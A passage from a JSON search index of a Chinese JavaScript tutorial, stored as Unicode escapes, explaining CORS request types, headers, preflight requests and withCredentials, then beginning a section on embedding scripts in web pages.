\u8fd9\u6837\u5212\u5206\u7684\u539f\u56e0\u662f\uff0c\u8868\u5355\u5728\u5386\u53f2\u4e0a\u4e00\u76f4\u53ef\u4ee5\u8de8\u57df\u53d1\u51fa\u8bf7\u6c42\u3002\u7b80\u5355\u8bf7\u6c42\u5c31\u662f\u8868\u5355\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u6cbf\u88ad\u4e86\u4f20\u7edf\u7684\u5904\u7406\u65b9\u5f0f\uff0c\u4e0d\u628a\u884c\u4e3a\u590d\u6742\u5316\uff0c\u5426\u5219\u5f00\u53d1\u8005\u53ef\u80fd\u8f6c\u800c\u4f7f\u7528\u8868\u5355\uff0c\u89c4\u907f CORS \u7684\u9650\u5236\u3002\u5bf9\u4e8e\u975e\u7b80\u5355\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u4f1a\u91c7\u7528\u65b0\u7684\u5904\u7406\u65b9\u5f0f\u3002","title":"\u4e24\u79cd\u8bf7\u6c42"},{"location":"bom/cors/#_3","text":"","title":"\u7b80\u5355\u8bf7\u6c42"},{"location":"bom/cors/#_4","text":"\u5bf9\u4e8e\u7b80\u5355\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u76f4\u63a5\u53d1\u51fa CORS \u8bf7\u6c42\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662f\u5728\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u589e\u52a0\u4e00\u4e2a Origin \u5b57\u6bb5\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6d4f\u89c8\u5668\u53d1\u73b0\u8fd9\u6b21\u8de8\u57df AJAX \u8bf7\u6c42\u662f\u7b80\u5355\u8bf7\u6c42\uff0c\u5c31\u81ea\u52a8\u5728\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u6dfb\u52a0\u4e00\u4e2a Origin \u5b57\u6bb5\u3002 1 2 3 4 5 6 GET /cors HTTP / 1.1 Origin : http://api.bob.com Host : api.alice.com Accept-Language : en-US Connection : keep-alive User-Agent : Mozilla/5.0... \u4e0a\u9762\u7684\u5934\u4fe1\u606f\u4e2d\uff0c Origin \u5b57\u6bb5\u7528\u6765\u8bf4\u660e\uff0c\u672c\u6b21\u8bf7\u6c42\u6765\u81ea\u54ea\u4e2a\u57df\uff08\u534f\u8bae + \u57df\u540d + \u7aef\u53e3\uff09\u3002\u670d\u52a1\u5668\u6839\u636e\u8fd9\u4e2a\u503c\uff0c\u51b3\u5b9a\u662f\u5426\u540c\u610f\u8fd9\u6b21\u8bf7\u6c42\u3002 \u5982\u679c Origin \u6307\u5b9a\u7684\u6e90\uff0c\u4e0d\u5728\u8bb8\u53ef\u8303\u56f4\u5185\uff0c\u670d\u52a1\u5668\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6b63\u5e38\u7684 HTTP \u56de\u5e94\u3002\u6d4f\u89c8\u5668\u53d1\u73b0\uff0c\u8fd9\u4e2a\u56de\u5e94\u7684\u5934\u4fe1\u606f\u6ca1\u6709\u5305\u542b Access-Control-Allow-Origin \u5b57\u6bb5\uff08\u8be6\u89c1\u4e0b\u6587\uff09\uff0c\u5c31\u77e5\u9053\u51fa\u9519\u4e86\uff0c\u4ece\u800c\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u88ab XMLHttpRequest \u7684 onerror \u56de\u8c03\u51fd\u6570\u6355\u83b7\u3002\u6ce8\u610f\uff0c\u8fd9\u79cd\u9519\u8bef\u65e0\u6cd5\u901a\u8fc7\u72b6\u6001\u7801\u8bc6\u522b\uff0c\u56e0\u4e3a HTTP \u56de\u5e94\u7684\u72b6\u6001\u7801\u6709\u53ef\u80fd\u662f200\u3002 \u5982\u679c Origin \u6307\u5b9a\u7684\u57df\u540d\u5728\u8bb8\u53ef\u8303\u56f4\u5185\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u54cd\u5e94\uff0c\u4f1a\u591a\u51fa\u51e0\u4e2a\u5934\u4fe1\u606f\u5b57\u6bb5\u3002 1 2 3 4 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 \u4e0a\u9762\u7684\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u6709\u4e09\u4e2a\u4e0e CORS \u8bf7\u6c42\u76f8\u5173\u7684\u5b57\u6bb5\uff0c\u90fd\u4ee5 Access-Control- \u5f00\u5934\u3002 \uff081\uff09 Access-Control-Allow-Origin \u8be5\u5b57\u6bb5\u662f\u5fc5\u987b\u7684\u3002\u5b83\u7684\u503c\u8981\u4e48\u662f\u8bf7\u6c42\u65f6 Origin \u5b57\u6bb5\u7684\u503c\uff0c\u8981\u4e48\u662f\u4e00\u4e2a * \uff0c\u8868\u793a\u63a5\u53d7\u4efb\u610f\u57df\u540d\u7684\u8bf7\u6c42\u3002 \uff082\uff09 Access-Control-Allow-Credentials \u8be5\u5b57\u6bb5\u53ef\u9009\u3002\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5141\u8bb8\u53d1\u9001 Cookie\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cCookie \u4e0d\u5305\u62ec\u5728 CORS \u8bf7\u6c42\u4e4b\u4e2d\u3002\u8bbe\u4e3a true \uff0c\u5373\u8868\u793a\u670d\u52a1\u5668\u660e\u786e\u8bb8\u53ef\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u628a Cookie \u5305\u542b\u5728\u8bf7\u6c42\u4e2d\uff0c\u4e00\u8d77\u53d1\u7ed9\u670d\u52a1\u5668\u3002\u8fd9\u4e2a\u503c\u4e5f\u53ea\u80fd\u8bbe\u4e3a true \uff0c\u5982\u679c\u670d\u52a1\u5668\u4e0d\u8981\u6d4f\u89c8\u5668\u53d1\u9001 Cookie\uff0c\u4e0d\u53d1\u9001\u8be5\u5b57\u6bb5\u5373\u53ef\u3002 \uff083\uff09 Access-Control-Expose-Headers \u8be5\u5b57\u6bb5\u53ef\u9009\u3002CORS \u8bf7\u6c42\u65f6\uff0c XMLHttpRequest \u5bf9\u8c61\u7684 getResponseHeader() \u65b9\u6cd5\u53ea\u80fd\u62ff\u52306\u4e2a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u57fa\u672c\u5b57\u6bb5\uff1a Cache-Control \u3001 Content-Language \u3001 Content-Type \u3001 Expires \u3001 Last-Modified \u3001 Pragma \u3002\u5982\u679c\u60f3\u62ff\u5230\u5176\u4ed6\u5b57\u6bb5\uff0c\u5c31\u5fc5\u987b\u5728 Access-Control-Expose-Headers \u91cc\u9762\u6307\u5b9a\u3002\u4e0a\u9762\u7684\u4f8b\u5b50\u6307\u5b9a\uff0c getResponseHeader('FooBar') \u53ef\u4ee5\u8fd4\u56de FooBar \u5b57\u6bb5\u7684\u503c\u3002","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"bom/cors/#withcredentials","text":"\u4e0a\u9762\u8bf4\u5230\uff0cCORS \u8bf7\u6c42\u9ed8\u8ba4\u4e0d\u5305\u542b Cookie \u4fe1\u606f\uff08\u4ee5\u53ca HTTP \u8ba4\u8bc1\u4fe1\u606f\u7b49\uff09\uff0c\u8fd9\u662f\u4e3a\u4e86\u964d\u4f4e CSRF \u653b\u51fb\u7684\u98ce\u9669\u3002\u4f46\u662f\u67d0\u4e9b\u573a\u5408\uff0c\u670d\u52a1\u5668\u53ef\u80fd\u9700\u8981\u62ff\u5230 Cookie\uff0c\u8fd9\u65f6\u9700\u8981\u670d\u52a1\u5668\u663e\u5f0f\u6307\u5b9a Access-Control-Allow-Credentials \u5b57\u6bb5\uff0c\u544a\u8bc9\u6d4f\u89c8\u5668\u53ef\u4ee5\u53d1\u9001 Cookie\u3002 1 Access-Control-Allow-Credentials: true \u540c\u65f6\uff0c\u5f00\u53d1\u8005\u5fc5\u987b\u5728 AJAX \u8bf7\u6c42\u4e2d\u6253\u5f00 withCredentials \u5c5e\u6027\u3002 1 2 var xhr = new XMLHttpRequest (); xhr . withCredentials = true ; \u5426\u5219\uff0c\u5373\u4f7f\u670d\u52a1\u5668\u8981\u6c42\u53d1\u9001 Cookie\uff0c\u6d4f\u89c8\u5668\u4e5f\u4e0d\u4f1a\u53d1\u9001\u3002\u6216\u8005\uff0c\u670d\u52a1\u5668\u8981\u6c42\u8bbe\u7f6e Cookie\uff0c\u6d4f\u89c8\u5668\u4e5f\u4e0d\u4f1a\u5904\u7406\u3002 \u4f46\u662f\uff0c\u6709\u7684\u6d4f\u89c8\u5668\u9ed8\u8ba4\u5c06 withCredentials \u5c5e\u6027\u8bbe\u4e3a true \u3002\u8fd9\u5bfc\u81f4\u5982\u679c\u7701\u7565 withCredentials \u8bbe\u7f6e\uff0c\u8fd9\u4e9b\u6d4f\u89c8\u5668\u53ef\u80fd\u8fd8\u662f\u4f1a\u4e00\u8d77\u53d1\u9001 Cookie\u3002\u8fd9\u65f6\uff0c\u53ef\u4ee5\u663e\u5f0f\u5173\u95ed withCredentials \u3002 1 xhr . withCredentials = false ; \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u670d\u52a1\u5668\u8981\u6c42\u6d4f\u89c8\u5668\u53d1\u9001 Cookie\uff0c Access-Control-Allow-Origin \u5c31\u4e0d\u80fd\u8bbe\u4e3a\u661f\u53f7\uff0c\u5fc5\u987b\u6307\u5b9a\u660e\u786e\u7684\u3001\u4e0e\u8bf7\u6c42\u7f51\u9875\u4e00\u81f4\u7684\u57df\u540d\u3002\u540c\u65f6\uff0cCookie \u4f9d\u7136\u9075\u5faa\u540c\u6e90\u653f\u7b56\uff0c\u53ea\u6709\u7528\u670d\u52a1\u5668\u57df\u540d\u8bbe\u7f6e\u7684 Cookie \u624d\u4f1a\u4e0a\u4f20\uff0c\u5176\u4ed6\u57df\u540d\u7684 Cookie \u5e76\u4e0d\u4f1a\u4e0a\u4f20\uff0c\u4e14\uff08\u8de8\u57df\uff09\u539f\u7f51\u9875\u4ee3\u7801\u4e2d\u7684 document.cookie \u4e5f\u65e0\u6cd5\u8bfb\u53d6\u670d\u52a1\u5668\u57df\u540d\u4e0b\u7684 Cookie\u3002","title":"withCredentials \u5c5e\u6027"},{"location":"bom/cors/#_5","text":"","title":"\u975e\u7b80\u5355\u8bf7\u6c42"},{"location":"bom/cors/#_6","text":"\u975e\u7b80\u5355\u8bf7\u6c42\u662f\u90a3\u79cd\u5bf9\u670d\u52a1\u5668\u63d0\u51fa\u7279\u6b8a\u8981\u6c42\u7684\u8bf7\u6c42\uff0c\u6bd4\u5982\u8bf7\u6c42\u65b9\u6cd5\u662f PUT \u6216 DELETE \uff0c\u6216\u8005 Content-Type \u5b57\u6bb5\u7684\u7c7b\u578b\u662f application/json \u3002 \u975e\u7b80\u5355\u8bf7\u6c42\u7684 CORS \u8bf7\u6c42\uff0c\u4f1a\u5728\u6b63\u5f0f\u901a\u4fe1\u4e4b\u524d\uff0c\u589e\u52a0\u4e00\u6b21 HTTP \u67e5\u8be2\u8bf7\u6c42\uff0c\u79f0\u4e3a\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff08preflight\uff09\u3002\u6d4f\u89c8\u5668\u5148\u8be2\u95ee\u670d\u52a1\u5668\uff0c\u5f53\u524d\u7f51\u9875\u6240\u5728\u7684\u57df\u540d\u662f\u5426\u5728\u670d\u52a1\u5668\u7684\u8bb8\u53ef\u540d\u5355\u4e4b\u4e2d\uff0c\u4ee5\u53ca\u53ef\u4ee5\u4f7f\u7528\u54ea\u4e9b HTTP \u65b9\u6cd5\u548c\u5934\u4fe1\u606f\u5b57\u6bb5\u3002\u53ea\u6709\u5f97\u5230\u80af\u5b9a\u7b54\u590d\uff0c\u6d4f\u89c8\u5668\u624d\u4f1a\u53d1\u51fa\u6b63\u5f0f\u7684 XMLHttpRequest \u8bf7\u6c42\uff0c\u5426\u5219\u5c31\u62a5\u9519\u3002\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u8fd9\u4e9b\u65b0\u589e\u7684\u8bf7\u6c42\uff0c\u5bf9\u4f20\u7edf\u7684\u6ca1\u6709 CORS \u652f\u6301\u7684\u670d\u52a1\u5668\u5f62\u6210\u538b\u529b\uff0c\u7ed9\u670d\u52a1\u5668\u4e00\u4e2a\u63d0\u524d\u62d2\u7edd\u7684\u673a\u4f1a\uff0c\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u670d\u52a1\u5668\u6536\u5230\u5927\u91cf DELETE \u548c PUT \u8bf7\u6c42\uff0c\u8fd9\u4e9b\u4f20\u7edf\u7684\u8868\u5355\u4e0d\u53ef\u80fd\u8de8\u57df\u53d1\u51fa\u7684\u8bf7\u6c42\u3002 \u4e0b\u9762\u662f\u4e00\u6bb5\u6d4f\u89c8\u5668\u7684 JavaScript \u811a\u672c\u3002 1 2 3 4 5 var url = 'http://api.alice.com/cors' ; var xhr = new XMLHttpRequest (); xhr . open ( 'PUT' , url , true ); xhr . setRequestHeader ( 'X-Custom-Header' , 'value' ); xhr . send (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cHTTP \u8bf7\u6c42\u7684\u65b9\u6cd5\u662f PUT \uff0c\u5e76\u4e14\u53d1\u9001\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5934\u4fe1\u606f X-Custom-Header \u3002 \u6d4f\u89c8\u5668\u53d1\u73b0\uff0c\u8fd9\u662f\u4e00\u4e2a\u975e\u7b80\u5355\u8bf7\u6c42\uff0c\u5c31\u81ea\u52a8\u53d1\u51fa\u4e00\u4e2a\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff0c\u8981\u6c42\u670d\u52a1\u5668\u786e\u8ba4\u53ef\u4ee5\u8fd9\u6837\u8bf7\u6c42\u3002\u4e0b\u9762\u662f\u8fd9\u4e2a\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u7684 HTTP \u5934\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 OPTIONS /cors HTTP / 1.1 Origin : http://api.bob.com Access-Control-Request-Method : PUT Access-Control-Request-Headers : X-Custom-Header Host : api.alice.com Accept-Language : en-US Connection : keep-alive User-Agent : Mozilla/5.0... \u201c\u9884\u68c0\u201d\u8bf7\u6c42\u7528\u7684\u8bf7\u6c42\u65b9\u6cd5\u662f OPTIONS \uff0c\u8868\u793a\u8fd9\u4e2a\u8bf7\u6c42\u662f\u7528\u6765\u8be2\u95ee\u7684\u3002\u5934\u4fe1\u606f\u91cc\u9762\uff0c\u5173\u952e\u5b57\u6bb5\u662f Origin \uff0c\u8868\u793a\u8bf7\u6c42\u6765\u81ea\u54ea\u4e2a\u6e90\u3002 \u9664\u4e86 Origin \u5b57\u6bb5\uff0c\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u5305\u62ec\u4e24\u4e2a\u7279\u6b8a\u5b57\u6bb5\u3002 \uff081\uff09 Access-Control-Request-Method \u8be5\u5b57\u6bb5\u662f\u5fc5\u987b\u7684\uff0c\u7528\u6765\u5217\u51fa\u6d4f\u89c8\u5668\u7684 CORS \u8bf7\u6c42\u4f1a\u7528\u5230\u54ea\u4e9b HTTP \u65b9\u6cd5\uff0c\u4e0a\u4f8b\u662f PUT \u3002 \uff082\uff09 Access-Control-Request-Headers \u8be5\u5b57\u6bb5\u662f\u4e00\u4e2a\u9017\u53f7\u5206\u9694\u7684\u5b57\u7b26\u4e32\uff0c\u6307\u5b9a\u6d4f\u89c8\u5668 CORS \u8bf7\u6c42\u4f1a\u989d\u5916\u53d1\u9001\u7684\u5934\u4fe1\u606f\u5b57\u6bb5\uff0c\u4e0a\u4f8b\u662f X-Custom-Header \u3002","title":"\u9884\u68c0\u8bf7\u6c42"},{"location":"bom/cors/#_7","text":"\u670d\u52a1\u5668\u6536\u5230\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u4ee5\u540e\uff0c\u68c0\u67e5\u4e86 Origin \u3001 Access-Control-Request-Method \u548c Access-Control-Request-Headers \u5b57\u6bb5\u4ee5\u540e\uff0c\u786e\u8ba4\u5141\u8bb8\u8de8\u6e90\u8bf7\u6c42\uff0c\u5c31\u53ef\u4ee5\u505a\u51fa\u56de\u5e94\u3002 1 2 3 4 5 6 7 8 9 10 11 12 HTTP / 1.1 200 OK Date : Mon, 01 Dec 2008 01:15:39 GMT Server : Apache/2.0.61 (Unix) Access-Control-Allow-Origin : http://api.bob.com Access-Control-Allow-Methods : GET, POST, PUT Access-Control-Allow-Headers : X-Custom-Header Content-Type : text/html; charset=utf-8 Content-Encoding : gzip Content-Length : 0 Keep-Alive : timeout=2, max=100 Connection : Keep-Alive Content-Type : text/plain \u4e0a\u9762\u7684 HTTP \u56de\u5e94\u4e2d\uff0c\u5173\u952e\u7684\u662f Access-Control-Allow-Origin \u5b57\u6bb5\uff0c\u8868\u793a http://api.bob.com \u53ef\u4ee5\u8bf7\u6c42\u6570\u636e\u3002\u8be5\u5b57\u6bb5\u4e5f\u53ef\u4ee5\u8bbe\u4e3a\u661f\u53f7\uff0c\u8868\u793a\u540c\u610f\u4efb\u610f\u8de8\u6e90\u8bf7\u6c42\u3002 1 Access-Control-Allow-Origin: * \u5982\u679c\u670d\u52a1\u5668\u5426\u5b9a\u4e86\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6b63\u5e38\u7684 HTTP \u56de\u5e94\uff0c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55 CORS \u76f8\u5173\u7684\u5934\u4fe1\u606f\u5b57\u6bb5\uff0c\u6216\u8005\u660e\u786e\u8868\u793a\u8bf7\u6c42\u4e0d\u7b26\u5408\u6761\u4ef6\u3002 1 2 3 4 OPTIONS http://api.bob.com HTTP / 1.1 Status : 200 Access-Control-Allow-Origin : https://notyourdomain.com Access-Control-Allow-Method : POST \u4e0a\u9762\u7684\u670d\u52a1\u5668\u56de\u5e94\uff0c Access-Control-Allow-Origin \u5b57\u6bb5\u660e\u786e\u4e0d\u5305\u62ec\u53d1\u51fa\u8bf7\u6c42\u7684 http://api.bob.com \u3002 \u8fd9\u65f6\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u8ba4\u5b9a\uff0c\u670d\u52a1\u5668\u4e0d\u540c\u610f\u9884\u68c0\u8bf7\u6c42\uff0c\u56e0\u6b64\u89e6\u53d1\u4e00\u4e2a\u9519\u8bef\uff0c\u88ab XMLHttpRequest \u5bf9\u8c61\u7684 onerror \u56de\u8c03\u51fd\u6570\u6355\u83b7\u3002\u63a7\u5236\u53f0\u4f1a\u6253\u5370\u51fa\u5982\u4e0b\u7684\u62a5\u9519\u4fe1\u606f\u3002 1 2 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. \u670d\u52a1\u5668\u56de\u5e94\u7684\u5176\u4ed6 CORS \u76f8\u5173\u5b57\u6bb5\u5982\u4e0b\u3002 1 2 3 4 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 \uff081\uff09 Access-Control-Allow-Methods \u8be5\u5b57\u6bb5\u5fc5\u9700\uff0c\u5b83\u7684\u503c\u662f\u9017\u53f7\u5206\u9694\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u660e\u670d\u52a1\u5668\u652f\u6301\u7684\u6240\u6709\u8de8\u57df\u8bf7\u6c42\u7684\u65b9\u6cd5\u3002\u6ce8\u610f\uff0c\u8fd4\u56de\u7684\u662f\u6240\u6709\u652f\u6301\u7684\u65b9\u6cd5\uff0c\u800c\u4e0d\u5355\u662f\u6d4f\u89c8\u5668\u8bf7\u6c42\u7684\u90a3\u4e2a\u65b9\u6cd5\u3002\u8fd9\u662f\u4e3a\u4e86\u907f\u514d\u591a\u6b21\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u3002 \uff082\uff09 Access-Control-Allow-Headers \u5982\u679c\u6d4f\u89c8\u5668\u8bf7\u6c42\u5305\u62ec Access-Control-Request-Headers \u5b57\u6bb5\uff0c\u5219 Access-Control-Allow-Headers \u5b57\u6bb5\u662f\u5fc5\u9700\u7684\u3002\u5b83\u4e5f\u662f\u4e00\u4e2a\u9017\u53f7\u5206\u9694\u7684\u5b57\u7b26\u4e32\uff0c\u8868\u660e\u670d\u52a1\u5668\u652f\u6301\u7684\u6240\u6709\u5934\u4fe1\u606f\u5b57\u6bb5\uff0c\u4e0d\u9650\u4e8e\u6d4f\u89c8\u5668\u5728\u201c\u9884\u68c0\u201d\u4e2d\u8bf7\u6c42\u7684\u5b57\u6bb5\u3002 \uff083\uff09 Access-Control-Allow-Credentials \u8be5\u5b57\u6bb5\u4e0e\u7b80\u5355\u8bf7\u6c42\u65f6\u7684\u542b\u4e49\u76f8\u540c\u3002 \uff084\uff09 Access-Control-Max-Age \u8be5\u5b57\u6bb5\u53ef\u9009\uff0c\u7528\u6765\u6307\u5b9a\u672c\u6b21\u9884\u68c0\u8bf7\u6c42\u7684\u6709\u6548\u671f\uff0c\u5355\u4f4d\u4e3a\u79d2\u3002\u4e0a\u9762\u7ed3\u679c\u4e2d\uff0c\u6709\u6548\u671f\u662f20\u5929\uff081728000\u79d2\uff09\uff0c\u5373\u5141\u8bb8\u7f13\u5b58\u8be5\u6761\u56de\u5e941728000\u79d2\uff08\u537320\u5929\uff09\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u4e0d\u7528\u53d1\u51fa\u53e6\u4e00\u6761\u9884\u68c0\u8bf7\u6c42\u3002","title":"\u9884\u68c0\u8bf7\u6c42\u7684\u56de\u5e94"},{"location":"bom/cors/#_8","text":"\u4e00\u65e6\u670d\u52a1\u5668\u901a\u8fc7\u4e86\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff0c\u4ee5\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u6b63\u5e38\u7684 CORS \u8bf7\u6c42\uff0c\u5c31\u90fd\u8ddf\u7b80\u5355\u8bf7\u6c42\u4e00\u6837\uff0c\u4f1a\u6709\u4e00\u4e2a Origin \u5934\u4fe1\u606f\u5b57\u6bb5\u3002\u670d\u52a1\u5668\u7684\u56de\u5e94\uff0c\u4e5f\u90fd\u4f1a\u6709\u4e00\u4e2a Access-Control-Allow-Origin \u5934\u4fe1\u606f\u5b57\u6bb5\u3002 \u4e0b\u9762\u662f\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u4e4b\u540e\uff0c\u6d4f\u89c8\u5668\u7684\u6b63\u5e38 CORS \u8bf7\u6c42\u3002 1 2 3 4 5 6 7 PUT /cors HTTP / 1.1 Origin : http://api.bob.com Host : api.alice.com X-Custom-Header : value Accept-Language : en-US Connection : keep-alive User-Agent : Mozilla/5.0... \u4e0a\u9762\u5934\u4fe1\u606f\u7684 Origin \u5b57\u6bb5\u662f\u6d4f\u89c8\u5668\u81ea\u52a8\u6dfb\u52a0\u7684\u3002 \u4e0b\u9762\u662f\u670d\u52a1\u5668\u6b63\u5e38\u7684\u56de\u5e94\u3002 1 2 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 \u4e0a\u9762\u5934\u4fe1\u606f\u4e2d\uff0c Access-Control-Allow-Origin \u5b57\u6bb5\u662f\u6bcf\u6b21\u56de\u5e94\u90fd\u5fc5\u5b9a\u5305\u542b\u7684\u3002","title":"\u6d4f\u89c8\u5668\u7684\u6b63\u5e38\u8bf7\u6c42\u548c\u56de\u5e94"},{"location":"bom/cors/#jsonp","text":"CORS \u4e0e JSONP \u7684\u4f7f\u7528\u76ee\u7684\u76f8\u540c\uff0c\u4f46\u662f\u6bd4 JSONP \u66f4\u5f3a\u5927\u3002JSONP \u53ea\u652f\u6301 GET \u8bf7\u6c42\uff0cCORS \u652f\u6301\u6240\u6709\u7c7b\u578b\u7684 HTTP \u8bf7\u6c42\u3002JSONP \u7684\u4f18\u52bf\u5728\u4e8e\u652f\u6301\u8001\u5f0f\u6d4f\u89c8\u5668\uff0c\u4ee5\u53ca\u53ef\u4ee5\u5411\u4e0d\u652f\u6301 CORS \u7684\u7f51\u7ad9\u8bf7\u6c42\u6570\u636e\u3002","title":"\u4e0e JSONP \u7684\u6bd4\u8f83"},{"location":"bom/cors/#_9","text":"Using CORS , Monsur Hossain HTTP access control (CORS) , MDN CORS , Ryan Miller Do You Really Know CORS? , Grzegorz Mirek","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/engine/","text":"\u6d4f\u89c8\u5668\u73af\u5883\u6982\u8ff0 \u00b6 JavaScript \u662f\u6d4f\u89c8\u5668\u7684\u5185\u7f6e\u811a\u672c\u8bed\u8a00\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6d4f\u89c8\u5668\u5185\u7f6e\u4e86 JavaScript \u5f15\u64ce\uff0c\u5e76\u4e14\u63d0\u4f9b\u5404\u79cd\u63a5\u53e3\uff0c\u8ba9 JavaScript \u811a\u672c\u53ef\u4ee5\u63a7\u5236\u6d4f\u89c8\u5668\u7684\u5404\u79cd\u529f\u80fd\u3002\u4e00\u65e6\u7f51\u9875\u5185\u5d4c\u4e86 JavaScript \u811a\u672c\uff0c\u6d4f\u89c8\u5668\u52a0\u8f7d\u7f51\u9875\uff0c\u5c31\u4f1a\u53bb\u6267\u884c\u811a\u672c\uff0c\u4ece\u800c\u8fbe\u5230\u64cd\u4f5c\u6d4f\u89c8\u5668\u7684\u76ee\u7684\uff0c\u5b9e\u73b0\u7f51\u9875\u7684\u5404\u79cd\u52a8\u6001\u6548\u679c\u3002 \u672c\u7ae0\u5f00\u59cb\u4ecb\u7ecd\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u5404\u79cd JavaScript \u63a5\u53e3\u3002\u9996\u5148\uff0c\u4ecb\u7ecd JavaScript \u4ee3\u7801\u5d4c\u5165\u7f51\u9875\u7684\u65b9\u6cd5\u3002 \u4ee3\u7801\u5d4c\u5165\u7f51\u9875\u7684\u65b9\u6cd5 \u00b6 \u7f51\u9875\u4e2d\u5d4c\u5165 JavaScript \u4ee3\u7801\uff0c\u4e3b\u8981\u6709\u56db\u79cd\u65b9\u6cd5\u3002 <script> \u5143\u7d20\u76f4\u63a5\u5d4c\u5165\u4ee3\u7801\u3002 <script> \u6807\u7b7e\u52a0\u8f7d\u5916\u90e8\u811a\u672c \u4e8b\u4ef6\u5c5e\u6027 URL \u534f\u8bae script \u5143\u7d20\u5d4c\u5165\u4ee3\u7801 \u00b6 <script> \u5143\u7d20\u5185\u90e8\u53ef\u4ee5\u76f4\u63a5\u5199\u5165 JavaScript \u4ee3\u7801\u3002 1 2 3 4 < script > var x = 1 + 5 ; console . log ( x ); </ script > <script> \u6807\u7b7e\u6709\u4e00\u4e2a type \u5c5e\u6027\uff0c\u7528\u6765\u6307\u5b9a\u811a\u672c\u7c7b\u578b\u3002\u5bf9 JavaScript \u811a\u672c\u6765\u8bf4\uff0c type \u5c5e\u6027\u53ef\u4ee5\u8bbe\u4e3a\u4e24\u79cd\u503c\u3002 text/javascript \uff1a\u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u4e5f\u662f\u5386\u53f2\u4e0a\u4e00\u8d2f\u8bbe\u5b9a\u7684\u503c\u3002\u5982\u679c\u4f60\u7701\u7565 type \u5c5e\u6027\uff0c\u9ed8\u8ba4\u5c31\u662f\u8fd9\u4e2a\u503c\u3002\u5bf9\u4e8e\u8001\u5f0f\u6d4f\u89c8\u5668\uff0c\u8bbe\u4e3a\u8fd9\u4e2a\u503c\u6bd4\u8f83\u597d\u3002 application/javascript \uff1a\u5bf9\u4e8e\u8f83\u65b0\u7684\u6d4f\u89c8\u5668\uff0c\u5efa\u8bae\u8bbe\u4e3a\u8fd9\u4e2a\u503c\u3002 1 2 3 < script type = \"application/javascript\" > console . log ( 'Hello World' ); </ script > \u7531\u4e8e <script> \u6807\u7b7e\u9ed8\u8ba4\u5c31\u662f JavaScript \u4ee3\u7801\u3002\u6240\u4ee5\uff0c\u5d4c\u5165 JavaScript \u811a\u672c\u65f6\uff0c type \u5c5e\u6027\u53ef\u4ee5\u7701\u7565\u3002 \u5982\u679c type \u5c5e\u6027\u7684\u503c\uff0c\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\uff0c\u90a3\u4e48\u5b83\u4e0d\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\u3002\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u5728 <script> \u6807\u7b7e\u4e4b\u4e2d\u5d4c\u5165\u4efb\u610f\u7684\u6587\u672c\u5185\u5bb9\uff0c\u53ea\u8981\u52a0\u4e0a\u4e00\u4e2a\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\u7684 type \u5c5e\u6027\u5373\u53ef\u3002 1 2 3 < script id = \"mydata\" type = \"x-custom-data\" > console . log ( 'Hello World' ); </ script > \u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u6d4f\u89c8\u5668\u4e0d\u4f1a\u6267\u884c\uff0c\u4e5f\u4e0d\u4f1a\u663e\u793a\u5b83\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u4e0d\u8ba4\u8bc6\u5b83\u7684 type \u5c5e\u6027\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a <script> \u8282\u70b9\u4f9d\u7136\u5b58\u5728\u4e8e DOM \u4e4b\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 <script> \u8282\u70b9\u7684 text 